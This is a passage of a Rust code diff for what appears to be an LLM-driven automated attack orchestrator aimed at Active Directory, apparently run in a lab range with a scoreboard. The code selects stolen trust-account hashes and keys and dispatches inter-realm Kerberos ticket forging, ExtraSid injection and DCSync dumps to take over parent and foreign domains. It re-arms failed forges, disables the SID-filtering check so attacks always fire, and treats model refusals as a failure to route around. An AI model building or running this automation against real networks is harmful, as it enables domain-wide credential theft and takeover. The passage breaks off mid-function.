@@ -11,7 +11,7 @@
 
 use std::collections::HashSet;
 use std::sync::Arc;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 use serde_json::json;
 use tokio::sync::watch;
@@ -21,6 +21,164 @@ use ares_llm::ToolCall;
 
 use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::state::*;
+
+/// Upper bound on how long a `trust_follow:<src>:<user>$` dedup entry can
+/// remain marked-processed without the spawned forge actually running before
+/// the next tick sweeps it and lets a later tick re-dispatch.
+///
+/// `auto_trust_follow` marks dedup *before* spawning the dispatch (to win the
+/// 30s tick race against double-firing while the forge is in flight). If
+/// anything between the mark and the spawn body's `dispatch_tool().await`
+/// silently fails — a dropped tracing event, a runtime cancellation, a panic
+/// that doesn't reach the parent — the dedup persists and the cross-forest
+/// pivot is permanently lost for the op. 3 min comfortably exceeds the
+/// observed `forge_inter_realm_and_dump` runtime (typically 20-60s) without
+/// stalling recovery for too long.
+const FORGE_STALENESS_LIMIT: Duration = Duration::from_secs(180);
+
+/// Drop any `trust_follow` dedup entries whose in-flight heartbeat has
+/// exceeded [`FORGE_STALENESS_LIMIT`]. Mutates `state` in place and returns
+/// the cleared keys so the caller can also unpersist them from Redis.
+///
+/// Split out as a pure helper so the staleness logic can be unit-tested
+/// without spinning up a full `Dispatcher` / Redis fixture.
+/// A forge that failed against a specific target and will keep failing until
+/// recon changes which host we aim at.
+#[derive(Debug, Clone)]
+pub struct WedgedForge {
+    pub target_domain: String,
+    pub target_dc_ip: String,
+    /// The hostname baked into the request that failed.
+    pub hostname: String,
+}
+
+/// Re-arm forges whose target resolution has since changed.
+///
+/// `KDC_ERR_S_PRINCIPAL_UNKNOWN` / `KDC_ERR_WRONG_REALM` mean we aimed at the
+/// wrong host, so retrying the identical request is pure waste — that is why
+/// the dedup mark is held. But the mark was previously held *forever*: the
+/// wedge dropped the `forge_in_flight` heartbeat, and the staleness sweep can
+/// only recover keys that still have one. So the moment recon persisted a real
+/// DC FQDN in the target domain — the exact condition that makes a retry
+/// succeed — nothing could act on it, and the pivot stayed dead for the op.
+///
+/// Comparing against the resolution that failed re-arms on new recon and only
+/// on new recon, so the hot-loop this wedge exists to stop cannot come back.
+fn sweep_rearmable_forge_wedges(state: &mut StateInner) -> Vec<String> {
+    let rearmed: Vec<String> = state
+        .forge_wedged
+        .iter()
+        .filter(|(_, w)| {
+            resolve_target_dc_hostname(
+                &state.hosts,
+                &state.netbios_to_fqdn,
+                &state.domains,
+                &w.target_dc_ip,
+                &w.target_domain,
+            ) != w.hostname
+        })
+        .map(|(k, _)| k.clone())
+        .collect();
+    for key in &rearmed {
+        state.forge_wedged.remove(key);
+        state.unmark_processed(DEDUP_TRUST_FOLLOW, key);
+    }
+    rearmed
+}
+
+/// A forge that ran to completion but dumped no target krbtgt.
+#[derive(Debug, Clone)]
+pub struct EmptyDumpForge {
+    pub source_domain: String,
+    pub target_domain: String,
+    pub trust_account: String,
+    /// Fingerprint of the trust material the empty dump was produced with.
+    pub material: String,
+    pub attempts: u32,
+}
+
+/// How many times an empty-dump forge may be re-armed by fresh trust material
+/// before the pivot is treated as genuinely closed (SID filtering).
+const MAX_EMPTY_DUMP_FORGE_ATTEMPTS: u32 = 3;
+
+/// Fingerprint the trust material currently in state for `(account, domain)`.
+///
+/// Two forges that would send byte-identical `ticketer` input share a
+/// fingerprint, so a re-arm fires on a genuinely new key and never on a
+/// re-observation of the same one.
+fn trust_material_fingerprint(
+    hashes: &[ares_core::models::Hash],
+    trust_account: &str,
+    source_domain: &str,
+) -> Option<String> {
+    let account_l = trust_account.to_lowercase();
+    let domain_l = source_domain.to_lowercase();
+    hashes
+        .iter()
+        .filter(|h| {
+            h.username.to_lowercase() == account_l
+                && (h.domain.is_empty() || h.domain.to_lowercase() == domain_l)
+                && !h.hash_value.is_empty()
+        })
+        .map(|h| {
+            format!(
+                "{}:{}",
+                h.hash_value.to_lowercase(),
+                h.aes_key.as_deref().unwrap_or("").to_lowercase()
+            )
+        })
+        .max()
+}
+
+/// Re-arm empty-dump forges whose trust material has since changed.
+///
+/// The forge produced a valid inter-realm TGS and the DCSync still returned
+/// nothing. Against a SID-filtered forest that is permanent, which is why the
+/// dedup mark is held. But the identical symptom is produced by a trust key
+/// that was stale, RC4-only against an AES-only KDC, or extracted before the
+/// AES256 variant upserted — and in every one of those cases a later
+/// extraction lands *different* material that would succeed. Comparing against
+/// the fingerprint that failed re-arms on new material and only on new
+/// material, so a genuinely filtered trust still converges to locked.
+fn sweep_rearmable_empty_dump_forges(state: &mut StateInner) -> Vec<(String, EmptyDumpForge)> {
+    let keys: Vec<String> = state
+        .forge_empty_dump
+        .iter()
+        .filter(|(_, e)| e.attempts < MAX_EMPTY_DUMP_FORGE_ATTEMPTS)
+        .filter(|(_, e)| {
+            trust_material_fingerprint(&state.hashes, &e.trust_account, &e.source_domain)
+                .is_some_and(|current| current != e.material)
+        })
+        .map(|(k, _)| k.clone())
+        .collect();
+    let mut rearmed = Vec::with_capacity(keys.len());
+    for key in keys {
+        if let Some(entry) = state.forge_empty_dump.remove(&key) {
+            let next = EmptyDumpForge {
+                attempts: entry.attempts + 1,
+                ..entry
+            };
+            state.forge_empty_dump.insert(key.clone(), next.clone());
+            state.unmark_processed(DEDUP_TRUST_FOLLOW, &key);
+            rearmed.push((key, next));
+        }
+    }
+    rearmed
+}
+
+fn sweep_stale_forge_in_flight(state: &mut StateInner) -> Vec<String> {
+    let stale: Vec<String> = state
+        .forge_in_flight
+        .iter()
+        .filter(|(_, started)| started.elapsed() >= FORGE_STALENESS_LIMIT)
+        .map(|(k, _)| k.clone())
+        .collect();
+    for key in &stale {
+        state.forge_in_flight.remove(key);
+        state.unmark_processed(DEDUP_TRUST_FOLLOW, key);
+    }
+    stale
+}
 
 /// Build a vuln_id for child-to-parent escalation.
 fn child_to_parent_vuln_id(child_domain: &str, parent_domain: &str) -> String {
@@ -38,6 +196,83 @@ fn forest_trust_vuln_id(source_domain: &str, target_domain: &str) -> String {
         source_domain.to_lowercase(),
         target_domain.to_lowercase()
     )
+}
+
+/// Resolve the FQDN to bake into the forged inter-realm TGS request for
+/// `target_domain`, falling back to `target_dc_ip` when no usable record
+/// exists.
+///
+/// Two records must never be selected, because both yield a service ticket
+/// request the target KDC rejects identically on every retry:
+///
+///   - The zone apex (`hostname == target_domain`). No `cifs/<bare-domain>`
+///     SPN is registered, so the request returns KDC_ERR_S_PRINCIPAL_UNKNOWN.
+///   - A DC of a *child* domain. `dc02.child.contoso.local` passes a naive
+///     `ends_with(".contoso.local")`, but asking the parent KDC for a
+///     principal in the child realm returns KDC_ERR_WRONG_REALM.
+///   - The *apex of a child domain*. `child.contoso.local` leaves exactly one
+///     label after stripping `.contoso.local`, so it is shape-indistinguishable
+///     from a legitimate host and the label-count test alone admits it. It is a
+///     realm name, not a host, so it fails the same way `dc02.child…` does.
+///     Only `known_domains` can tell the two apart — hence the parameter.
+///
+/// So the suffix test requires exactly one label to remain after stripping
+/// `.{target_domain}` *and* the candidate must not name a known domain.
+///
+/// When no `hosts` record qualifies, `netbios_to_fqdn` is consulted before
+/// giving up. A DC whose only `hosts` entry carries the zone apex as its
+/// hostname is rejected by both tests above, yet recon routinely records its
+/// real FQDN in the NetBIOS map from the SMB banner. Without this the fallback
+/// yields `cifs/<ip>`, which no KDC has an SPN for. Candidates are sorted so
+/// the result is stable across calls — `sweep_rearmable_forge_wedges` compares
+/// this against the previously recorded resolution, and a `HashMap`-ordered
+/// pick would re-arm the wedge at random.
+fn resolve_target_dc_hostname(
+    hosts: &[ares_core::models::Host],
+    netbios_to_fqdn: &std::collections::HashMap<String, String>,
+    known_domains: &[String],
+    target_dc_ip: &str,
+    target_domain: &str,
+) -> String {
+    let target_lc = target_domain.to_lowercase();
+    let apexes: std::collections::HashSet<String> = known_domains
+        .iter()
+        .map(|d| d.trim().trim_end_matches('.').to_lowercase())
+        .chain(std::iter::once(target_lc.clone()))
+        .filter(|d| !d.is_empty())
+        .collect();
+    let names_a_domain = |hostname: &str| apexes.contains(hostname.trim_end_matches('.'));
+    let non_apex = |hostname: &str| {
+        let lc = hostname.to_lowercase();
+        !lc.is_empty() && !names_a_domain(&lc)
+    };
+    let in_target_domain = |hostname: &str| {
+        let lc = hostname.to_lowercase();
+        !names_a_domain(&lc)
+            && lc
+                .strip_suffix(&format!(".{target_lc}"))
+                .is_some_and(|label| !label.is_empty() && !label.contains('.'))
+    };
+
+    hosts
+        .iter()
+        .find(|h| h.ip == target_dc_ip && non_apex(&h.hostname))
+        .map(|h| h.hostname.clone())
+        .or_else(|| {
+            hosts
+                .iter()
+                .find(|h| (h.is_dc || h.detect_dc()) && in_target_domain(&h.hostname))
+                .map(|h| h.hostname.clone())
+        })
+        .or_else(|| {
+            let mut candidates: Vec<&String> = netbios_to_fqdn
+                .values()
+                .filter(|fqdn| in_target_domain(fqdn))
+                .collect();
+            candidates.sort();
+            candidates.first().map(|fqdn| (*fqdn).clone())
+        })
+        .unwrap_or_else(|| target_dc_ip.to_string())
 }
 
 /// Maps a `source → target` trust escalation to its scoreboard tokens:
@@ -65,6 +300,42 @@ fn classify_trust_escalation(
             "Child-to-parent escalation",
         )
     }
+}
+
+/// Timeline description and MITRE techniques for a successful trust forge.
+///
+/// Branches on `is_inter_forest` — the same predicate
+/// [`classify_trust_escalation`] uses to pick the vuln type — so the event and
+/// the vulnerability can never disagree. Branching on `is_child_to_parent`
+/// instead put a parent→child forge (intra-forest, classified
+/// `child_to_parent`) on the inter-forest arm, stamping T1550.003 where
+/// T1003.006 belonged and corrupting the red/blue technique-ID join.
+fn trust_escalation_event_fields(
+    source_domain: &str,
+    target_domain: &str,
+    trust_account: &str,
+) -> (String, Vec<String>) {
+    if is_inter_forest(source_domain, target_domain) {
+        return (
+            format!(
+                "Forest trust escalation: {source_domain} \u{2192} {target_domain} via trust key {trust_account}"
+            ),
+            vec!["T1134.005".to_string(), "T1550.003".to_string()],
+        );
+    }
+    let source_l = source_domain.to_lowercase();
+    let target_l = target_domain.to_lowercase();
+    let direction = if source_l != target_l && source_l.ends_with(&format!(".{target_l}")) {
+        "Child-to-parent"
+    } else {
+        "Parent-to-child"
+    };
+    (
+        format!(
+            "{direction} ExtraSid escalation: {source_domain} \u{2192} {target_domain} via {trust_account} trust key"
+        ),
+        vec!["T1134.005".to_string(), "T1003.006".to_string()],
+    )
 }
 
 /// Build a trust account name from a flat name (e.g. "FABRIKAM" -> "FABRIKAM$").
@@ -138,25 +409,24 @@ fn is_inter_forest(source: &str, target: &str) -> bool {
     true
 }
 
-/// Returns true if the trust source→target is inter-forest with SID filtering
-/// active — meaning `forge_inter_realm_and_dump` will be rejected at DCSync
-/// regardless of trust key validity. Caller should suppress the doomed
-/// dispatch and accelerate cross-forest fallback paths instead.
-///
-/// Decision tree:
-/// - Intra-forest (child↔parent or same domain): false (raise_child handles it)
-/// - Explicit `TrustInfo` with `is_cross_forest()` and `sid_filtering=true`: true
-/// - Explicit `TrustInfo` with `is_cross_forest()` and `sid_filtering=false`:
-///   false (someone disabled SID filtering — try the forge)
-/// - No `TrustInfo` but the names are inter-forest: false (try the forge —
-///   missing metadata means we can't be sure SID filtering is on, and the
-///   ~30s cost of an unnecessary attempt is cheaper than silently dropping
-///   a valid attack path on a misconfigured trust)
+/// Returns false — the dispatch never injects ExtraSid for cross-forest
+/// (see `needs_target_sid = is_child_to_parent` in `auto_trust_follow`), so
+/// SID filtering doesn't reject what the tool actually sends. A doomed
+/// forge costs one dispatch; a suppressed forge costs the domain.
 fn is_filtered_inter_forest_trust(state: &StateInner, source: &str, target: &str) -> bool {
-    if !is_inter_forest(source, target) {
+    let target_l = target.to_lowercase();
+    let inter_forest = is_inter_forest(source, target);
+    if !inter_forest {
+        debug!(
+            source = %source,
+            target = %target,
+            inter_forest = false,
+            decision = false,
+            reason = "same_forest_by_name",
+            "trust filter predicate"
+        );
         return false;
     }
-    let target_l = target.to_lowercase();
     // Look up only the target's metadata. `trusted_domains` is keyed by the
     // foreign-side domain name in each enumeration result, so the entry for
     // `target_l` describes the source→target relationship. Falling back to
@@ -164,18 +434,39 @@ fn is_filtered_inter_forest_trust(state: &StateInner, source: &str, target: &str
     // (e.g. child→contoso parent_child stored under "contoso.local"
     // when we query contoso→fabrikam), which would wrongly classify the
     // unknown cross-forest path as intra-forest and let the doomed forge fire.
+    //
+    // The diagnostic block below disambiguates three reasons the
+    // "Suppressing forge_inter_realm_and_dump" branch can fail to fire:
+    // (a) trust-enum hasn't yet populated `trusted_domains` for the target,
+    // (b) the entry is under a different key, or
+    // (c) `is_cross_forest()` returned false on the entry.
+    let known_keys: Vec<&str> = state.trusted_domains.keys().map(String::as_str).collect();
     if let Some(t) = state.trusted_domains.get(&target_l) {
-        if t.is_cross_forest() {
-            return t.sid_filtering;
-        }
-        // Trust enumeration disagrees with name-based heuristic — trust the
-        // explicit metadata (e.g. unusual same-forest cross-DNS-suffix setup).
+        debug!(
+            source = %source,
+            target = %target,
+            inter_forest = true,
+            metadata_present = true,
+            trust_type = %t.trust_type,
+            trust_direction = %t.direction,
+            is_cross_forest = t.is_cross_forest(),
+            sid_filtering = t.sid_filtering,
+            decision = false,
+            trusted_domains_keys = ?known_keys,
+            "trust filter predicate"
+        );
         return false;
     }
-    // No metadata — try the forge. False positives (SID filtering actually on)
-    // cost ~30s for a doomed DCSync attempt; false negatives (refusing a valid
-    // attack on a misconfigured trust where SID filtering is off) cost the
-    // entire foreign domain. Prefer the cheaper failure mode.
+    debug!(
+        source = %source,
+        target = %target,
+        inter_forest = true,
+        metadata_present = false,
+        decision = false,
+        reason = "no_metadata_try_forge",
+        trusted_domains_keys = ?known_keys,
+        "trust filter predicate"
+    );
     false
 }
 
@@ -344,166 +635,102 @@ fn resolve_target_fqdn_from_signals(
         .find(|fqdn| label_matches(fqdn))
 }
 
-/// Build the candidate child set for child-to-parent escalation.
+/// Build trust-follow work items directly from `discovered_vulnerabilities`.
 ///
-/// The set is the union of:
-/// - lowercased `state.dominated_domains` (krbtgt observed there)
-/// - lowercased domains of every `Administrator` NTLM hash in `state.hashes`
-///   with non-empty hash value AND non-empty domain (so GOAD-style local-SAM
-///   admin reuse can trigger the escalation before krbtgt is dumped)
+/// The hash-iteration path inside `auto_trust_follow` silently filters a
+/// candidate trust account at three points (empty source domain after
+/// fallback, no resolvable target FQDN, dedup already marked). Each filter
+/// returns `None` from inside a `filter_map`, so a single bad heuristic
+/// permanently drops a valid attack with no INFO trace. Reproduced as: a
+/// FABRIKAM$ trust key captured on a contoso DC dump produced a
+/// `forest_trust_escalation` vuln with `target=192.168.58.40,
+/// source_domain=contoso.local, target_domain=fabrikam.local` — yet the
+/// hash-iteration path emitted zero `forge_inter_realm_and_dump` dispatches
+/// across the rest of the operation.
 ///
-/// Returns an empty set when neither source has any entries.
-pub(crate) fn collect_candidate_children(state: &StateInner) -> HashSet<String> {
-    let mut out: HashSet<String> = state
-        .dominated_domains
-        .iter()
-        .map(|d| d.to_lowercase())
-        .collect();
-    for h in state.hashes.iter() {
-        if h.username.eq_ignore_ascii_case("administrator")
-            && h.hash_type.eq_ignore_ascii_case("NTLM")
-            && !h.hash_value.is_empty()
-            && !h.domain.is_empty()
-        {
-            out.insert(h.domain.to_lowercase());
-        }
-    }
-    out
-}
-
-/// A single child→parent work item: `(dedup_key, child_domain, parent_domain, child_dc_ip)`.
-pub(crate) type ChildToParentWorkItem = (String, String, String, String);
-
-/// Build child-to-parent escalation work via the intra-forest FQDN derivation
-/// path (Path A). For each candidate child FQDN with 3+ labels, the parent is
-/// `labels[1..].join(".")`. Skips parents already dominated, children whose DC
-/// IP isn't resolvable, and dedup keys already processed.
-pub(crate) fn build_child_to_parent_work_path_a(
-    state: &StateInner,
-    candidates: &HashSet<String>,
-) -> Vec<ChildToParentWorkItem> {
+/// The analyzer that builds the vuln (see `build_trust_escalation_vuln`) has
+/// already resolved `target_dc_ip` (stored as `v.target`) and stashed the
+/// trust account, source, and target in `details`. Rebuilding the work item
+/// from those fields is robust against any FQDN-resolution gap that hides the
+/// hash from the iteration path.
+///
+/// Callers merge with the hash-iteration result, deduping by `dedup_key`. Put
+/// vuln-driven items first in the merge so a duplicate key prefers the
+/// analyzer's resolved `target_dc_ip` over the hash path's possibly-None one.
+fn collect_trust_follow_work_from_vulns(state: &StateInner) -> Vec<TrustFollowWork> {
     let mut out = Vec::new();
-    for child_domain in candidates.iter() {
-        let cd_lower = child_domain.to_lowercase();
-        let labels: Vec<&str> = cd_lower.split('.').collect();
-        if labels.len() < 3 {
+    for v in state.discovered_vulnerabilities.values() {
+        if v.vuln_type != "forest_trust_escalation" {
             continue;
         }
-        let parent_domain = labels[1..].join(".");
-        if parent_domain.is_empty() || !parent_domain.contains('.') {
+        if state.exploited_vulnerabilities.contains(&v.vuln_id) {
             continue;
         }
-        if state.dominated_domains.contains(&parent_domain) {
+        let Some(source_domain) = v.details.get("source_domain").and_then(|x| x.as_str()) else {
             continue;
-        }
-        if state.resolve_dc_ip(&parent_domain).is_none() {
-            continue;
-        }
-        let key = format!("raise_child:{cd_lower}");
-        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
-            continue;
-        }
-        let child_dc_ip = match state.domain_controllers.get(&cd_lower) {
-            Some(ip) => ip.clone(),
-            None => continue,
         };
-        out.push((key, child_domain.clone(), parent_domain, child_dc_ip));
-    }
-    out
-}
+        let Some(target_domain) = v.details.get("target_domain").and_then(|x| x.as_str()) else {
+            continue;
+        };
+        let Some(trust_account) = v.details.get("trust_account").and_then(|x| x.as_str()) else {
+            continue;
+        };
 
-/// Build child-to-parent escalation work via the explicit-trust path (Path B).
-/// Walks every `parent_child` trust in `state.trusted_domains`, matches a
-/// candidate child whose lowercased FQDN ends with `.{parent_lc}`, and emits
-/// a work item if the dedup key is not already in `existing_keys` or marked
-/// processed. The `existing_keys` set lets the caller pass the keys already
-/// emitted from Path A so they're not duplicated.
-pub(crate) fn build_child_to_parent_work_path_b(
-    state: &StateInner,
-    candidates: &HashSet<String>,
-    existing_keys: &HashSet<String>,
-) -> Vec<ChildToParentWorkItem> {
-    let mut out = Vec::new();
-    if state.trusted_domains.is_empty() {
-        return out;
-    }
-    for trust in state.trusted_domains.values() {
-        if !trust.is_parent_child() {
-            continue;
-        }
-        let parent_domain = trust.domain.clone();
-        let parent_lc = parent_domain.to_lowercase();
-        if state.dominated_domains.contains(&parent_lc) {
-            continue;
-        }
-        let child_domain = match candidates
+        let source_lower = source_domain.to_lowercase();
+        let target_lower = target_domain.to_lowercase();
+        let trust_lower = trust_account.to_lowercase();
+
+        // Prefer confirmed trust material, then current keys over
+        // `_history0`/`_prev` rows — mirrors the hash-iteration sort at the
+        // auto_trust_follow call site.
+        //
+        // Ranking on `is_previous` alone left the choice to iteration order
+        // whenever two same-named rows were both current, which is exactly what
+        // a computer-object takeover produces: `certipy_shadow` on `FABRIKAM$`
+        // yields that account's NT hash, not the inter-realm trust key. Forging
+        // with it fails KRB_AP_ERR_BAD_INTEGRITY every time.
+        let Some(hash) = state
+            .hashes
             .iter()
-            .find(|d| d.to_lowercase().ends_with(&format!(".{parent_lc}")))
-        {
-            Some(d) => d.clone(),
-            None => continue,
+            .filter(|h| {
+                h.username.eq_ignore_ascii_case(trust_account)
+                    && h.hash_type.eq_ignore_ascii_case("NTLM")
+                    && !h.hash_value.is_empty()
+                    && (h.domain.is_empty() || h.domain.eq_ignore_ascii_case(source_domain))
+            })
+            .min_by_key(|h| (!h.is_trust_key as u8, h.is_previous as u8))
+            .cloned()
+        else {
+            continue;
         };
-        let key = format!("raise_child:{}", child_domain.to_lowercase());
-        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
+
+        let dedup_key = format!("trust_follow:{source_lower}:{trust_lower}");
+        if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
             continue;
         }
-        if existing_keys.contains(&key) {
-            continue;
-        }
-        let child_dc_ip = match state.domain_controllers.get(&child_domain.to_lowercase()) {
-            Some(ip) => ip.clone(),
-            None => continue,
+
+        // `v.target` is the analyzer's resolved DC IP at vuln-creation time.
+        // Empty target falls through to the live DC map.
+        let target_dc_ip = if !v.target.is_empty() {
+            Some(v.target.clone())
+        } else {
+            state.resolve_dc_ip(target_domain)
         };
-        out.push((key, child_domain, parent_domain, child_dc_ip));
+
+        let source_domain_sid = state.domain_sids.get(&source_lower).cloned();
+        let target_domain_sid = state.domain_sids.get(&target_lower).cloned();
+
+        out.push(TrustFollowWork {
+            dedup_key,
+            hash,
+            source_domain: source_domain.to_string(),
+            target_domain: target_domain.to_string(),
+            target_dc_ip,
+            source_domain_sid,
+            target_domain_sid,
+        });
     }
     out
-}
-
-/// Find the admin credential to drive a child→parent escalation against
-/// `child_domain`. Returns a `(payload_object, auth_method_tag)` pair where
-/// the JSON object holds either `{username, password}` or
-/// `{username, admin_hash}` per the auth method.
-///
-/// Preference: same-domain admin password credential first, then same-domain
-/// Administrator NTLM hash. Returns `(None, "none")` when neither is present.
-pub(crate) fn find_child_to_parent_admin_cred(
-    state: &StateInner,
-    child_domain: &str,
-) -> (Option<serde_json::Value>, &'static str) {
-    let cd = child_domain.to_lowercase();
-    let pw_cred = state
-        .credentials
-        .iter()
-        .find(|c| c.is_admin && !c.password.is_empty() && c.domain.to_lowercase() == cd)
-        .cloned();
-    if let Some(cred) = pw_cred {
-        return (
-            Some(json!({
-                "username": cred.username,
-                "password": cred.password,
-            })),
-            "password",
-        );
-    }
-    let admin_hash = state
-        .hashes
-        .iter()
-        .find(|h| {
-            h.username.to_lowercase() == "administrator"
-                && h.domain.to_lowercase() == cd
-                && h.hash_type.to_uppercase() == "NTLM"
-        })
-        .cloned();
-    if let Some(h) = admin_hash {
-        return (
-            Some(json!({
-                "username": "Administrator",
-                "admin_hash": h.hash_value,
-            })),
-            "hash",
-        );
-    }
-    (None, "none")
 }
 
 /// Monitors for trust account hashes and dispatches cross-domain attacks.
@@ -521,6 +748,58 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             break;
         }
 
+        // Sweep stale forge_in_flight entries before doing real work this
+        // tick. The pre-spawn `mark_processed` at the cross-forest forge site
+        // is correct under normal conditions (it stops the next 30s tick from
+        // double-firing while the forge is running) but it leaves a permanent
+        // mark if the spawn never actually runs the tool. Without this sweep,
+        // a single dropped spawn kills the cross-forest pivot for the rest of
+        // the op even though the trust key sits in state ready to use.
+        let (stale, rearmed, redumped) = {
+            let mut state = dispatcher.state.write().await;
+            let rearmed = sweep_rearmable_forge_wedges(&mut state);
+            let redumped = sweep_rearmable_empty_dump_forges(&mut state);
+            (sweep_stale_forge_in_flight(&mut state), rearmed, redumped)
+        };
+        for key in rearmed {
+            let _ = dispatcher
+                .state
+                .unpersist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                .await;
+            info!(
+                dedup_key = %key,
+                "Re-armed trust forge — recon now resolves a different target DC than the one that failed"
+            );
+        }
+        for (key, entry) in redumped {
+            let _ = dispatcher
+                .state
+                .unpersist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                .await;
+            info!(
+                dedup_key = %key,
+                source_domain = %entry.source_domain,
+                target_domain = %entry.target_domain,
+                trust_account = %entry.trust_account,
+                attempts = entry.attempts,
+                "Re-armed trust forge — a different trust key landed since the dump that returned no target krbtgt"
+            );
+        }
+        for key in stale {
+            let _ = dispatcher
+                .state
+                .unpersist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                .await;
+            warn!(
+                dedup_key = %key,
+                "Cleared stale trust_follow dedup mark — forge_in_flight exceeded staleness limit without dispatch completing"
+            );
+        }
+
+        // Operator escape hatch: dispatch any force-inter-realm-forge requests
+        // queued via `ares ops force-inter-realm-forge` before the normal path.
+        drain_force_forge_requests(&dispatcher).await;
+
         // Auto-enumerate trusts when DA is achieved
         {
             let state = dispatcher.state.read().await;
@@ -532,11 +811,10 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 //
                 // Iterate the union of `domain_controllers` keys and
                 // `dominated_domains`. The latter covers the case where a
-                // domain was compromised (e.g. via raise_child to the parent)
-                // but its DC was never explicitly seeded into
-                // `domain_controllers` — without this, parent-DC trust
-                // enumeration would never fire and cross-forest trusts would
-                // remain undiscovered.
+                // domain was compromised via a child→parent forge but its
+                // DC was never explicitly seeded into `domain_controllers`
+                // — without this, parent-DC trust enumeration would never
+                // fire and cross-forest trusts would remain undiscovered.
                 let mut candidate_domains: HashSet<String> = state
                     .domain_controllers
                     .keys()
@@ -776,508 +1054,27 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             }
         }
 
-        // Child-to-parent escalation (ExtraSid via raiseChild)
+        // Extract trust keys for every known trust (intra-forest and
+        // cross-forest alike).
         //
-        // Dispatches when a child domain is dominated and its parent FQDN is
-        // known. We derive the parent FQDN by stripping the leftmost label of
-        // the dominated child (always valid intra-forest — child FQDN is
-        // `{label}.{parent_fqdn}` by AD construction), then ALSO union with
-        // any explicit parent_child trusts discovered via LDAP enumeration.
+        // Intra-forest `parent_child` trusts ride the same pipeline as
+        // cross-forest: secretsdump the trust account (e.g. `CHILD$`) on
+        // the forest-root DC, then let the forge work-collection below pick
+        // it up for `forge_inter_realm_and_dump` with
+        // `extra_sid=<parent_sid>-519` for ExtraSid injection. The forest-
+        // root preference at `min_by_key(|(domain, _)| domain.split('.')
+        // .count())` selects the right DC for both directions.
         //
-        // The intra-forest derivation lets us fire immediately on child DA,
-        // bypassing the trust enumeration round-trip — without it we'd block
-        // until `trusted_domains` was populated, which sometimes never
-        // happens (LLM refusal, network, throttle starvation).
-        {
-            let state = dispatcher.state.read().await;
-            let candidate_children = collect_candidate_children(&state);
-            if !candidate_children.is_empty() {
-                let mut child_work = build_child_to_parent_work_path_a(&state, &candidate_children);
-                let existing_keys: HashSet<String> =
-                    child_work.iter().map(|(k, _, _, _)| k.clone()).collect();
-                let path_b =
-                    build_child_to_parent_work_path_b(&state, &candidate_children, &existing_keys);
-                child_work.extend(path_b);
-
-                drop(state);
-
-                for (key, child_domain, parent_domain, dc_ip) in child_work {
-                    let (cred_payload, auth_method) = {
-                        let s = dispatcher.state.read().await;
-                        find_child_to_parent_admin_cred(&s, &child_domain)
-                    };
-
-                    let Some(cred) = cred_payload else {
-                        debug!(
-                            child_domain = %child_domain,
-                            parent_domain = %parent_domain,
-                            "No admin cred/hash for child domain — deferring child-to-parent"
-                        );
-                        continue;
-                    };
-
-                    // Publish vulnerability
-                    let vuln_id = child_to_parent_vuln_id(&child_domain, &parent_domain);
-                    {
-                        let mut details = std::collections::HashMap::new();
-                        details.insert(
-                            "source_domain".into(),
-                            serde_json::Value::String(child_domain.clone()),
-                        );
-                        details.insert(
-                            "target_domain".into(),
-                            serde_json::Value::String(parent_domain.clone()),
-                        );
-                        details.insert(
-                            "note".into(),
-                            serde_json::Value::String(format!(
-                                "Child-to-parent escalation via ExtraSid — {} → {}",
-                                child_domain, parent_domain
-                            )),
-                        );
-                        let vuln = ares_core::models::VulnerabilityInfo {
-                            vuln_id: vuln_id.clone(),
-                            vuln_type: "child_to_parent".to_string(),
-                            target: dc_ip.clone(),
-                            discovered_by: "trust_automation".to_string(),
-                            discovered_at: chrono::Utc::now(),
-                            details,
-                            recommended_agent: String::new(),
-                            priority: 1,
-                        };
-                        let _ = dispatcher
-                            .state
-                            .publish_vulnerability(&dispatcher.queue, vuln)
-                            .await;
-                    }
-
-                    // Dispatch child-to-parent exploit task.  The LLM prompt
-                    // offers raiseChild (automated) and manual ExtraSid golden
-                    // ticket creation as alternatives.
-                    // `dc_ip` is the child DC (for trust key extraction).
-                    // `target` should be the parent DC (for secretsdump after forging ticket).
-                    // Use resolve_dc_ip so the hosts table fills in when
-                    // domain_controllers lacks the parent — falls back to the
-                    // child DC only as a last resort (DCSync can succeed
-                    // against any writable DC in the parent domain).
-                    let parent_dc_ip = {
-                        let s = dispatcher.state.read().await;
-                        s.resolve_dc_ip(&parent_domain)
-                            .unwrap_or_else(|| dc_ip.clone())
-                    };
-                    let mut payload = json!({
-                        "technique": "create_inter_realm_ticket",
-                        "vuln_type": "child_to_parent",
-                        "domain": child_domain,
-                        "trusted_domain": parent_domain,
-                        "target_domain": parent_domain,
-                        "target": &parent_dc_ip,
-                        "dc_ip": dc_ip,
-                        "vuln_id": &vuln_id,
-                    });
-                    // Merge credential fields
-                    if let Some(obj) = cred.as_object() {
-                        for (k, v) in obj {
-                            payload[k] = v.clone();
-                        }
-                    }
-                    // Add domain SIDs and child krbtgt (for ExtraSid via child
-                    // krbtgt — preferred path, no inter-realm trust key needed).
-                    //
-                    // The ExtraSid attack requires the PARENT forest SID (RID 519
-                    // = Enterprise Admins). If we ship the child SID by mistake,
-                    // the parent KDC rejects the ticket with KDC_ERR_PREAUTH_FAILED
-                    // because the embedded SID doesn't resolve to a real EA group.
-                    // So if the parent SID isn't cached, resolve it via lookupsid
-                    // against the parent DC using child admin creds (cross-trust
-                    // SAMR works) BEFORE dispatching the exploit task. Defer the
-                    // dispatch (no dedup mark) when resolution fails so the next
-                    // 30s tick can retry once host scans / DC enumeration progress.
-                    let parent_lower = parent_domain.to_lowercase();
-                    let cd_lower = child_domain.to_lowercase();
-                    let (
-                        mut have_target_sid,
-                        mut have_source_sid,
-                        child_admin_cred,
-                        child_admin_hash,
-                        child_dc_ip,
-                    ) = {
-                        let s = dispatcher.state.read().await;
-                        if let Some(sid) = s.domain_sids.get(&cd_lower) {
-                            payload["source_sid"] = json!(sid);
-                        }
-                        if let Some(sid) = s.domain_sids.get(&parent_lower) {
